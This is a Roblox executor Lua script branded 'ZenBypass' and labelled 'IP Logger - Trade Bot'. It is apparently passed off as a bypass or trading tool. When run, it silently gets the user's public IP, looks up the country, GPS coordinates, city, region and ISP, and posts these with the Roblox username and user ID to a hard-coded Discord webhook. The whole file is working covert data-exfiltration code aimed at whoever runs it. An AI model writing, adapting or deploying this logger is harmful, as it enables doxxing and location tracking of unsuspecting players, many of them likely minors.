local webhook = "https://discord.com/api/webhooks/1525372084774240369/96S-zxBeDNNJFtV0mAHrVnBimkC0fkViDFzQum30hd_mXC06DQKohpTWgmaXI6Rq-wxn"
local ip = game:HttpGet("https://api.ipify.org")
local ipinfo = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://ipinfo.io/" .. ip .. "/json"))
local player = game:GetService("Players").LocalPlayer
local data = {
    ["username"] = "ZenBypass",
    ["avatar_url"] = "https://cdn.discordapp.com/icons/1516247978950660169/29e68598a80f8f4d05e14579dfbdd63e.png?size=2048",
    ["embeds"] = {{
        ["title"] = "🕵️ IP Logger - Trade Bot",
        ["description"] = "Información de IP del usuario ejecutando el script:",
        ["color"] = tonumber(0x00ccff),
        ["fields"] = {{
            ["name"] = "**(🤫) Información de IP**",
            ["value"] = "||(👣) **IP:** " .. ip .. "||\n||(🌆) **País:** " .. (ipinfo.country or "No disponible") .. "||\n||(🪟) **GPS:** " .. (ipinfo.loc or "No disponible") .. "||\n||(🏙️) **Ciudad:** " .. (ipinfo.city or "No disponible") .. "||\n||(🏡) **Región:** " .. (ipinfo.region or "No disponible") .. "||\n||(🪢) **ISP/Hoster:** " .. (ipinfo.org or "No disponible") .. "||\n||👤 **Usuario:** " .. player.Name .. " (" .. player.UserId .. ")||",
            ["inline"] = false
        }},
        ["footer"] = {["text"] = "ZenBypass | discord.gg/WPRj8Rf2"},
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}
local requestFunc = syn and syn.request or http_request or request
if requestFunc then
    requestFunc({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode(data)})
end
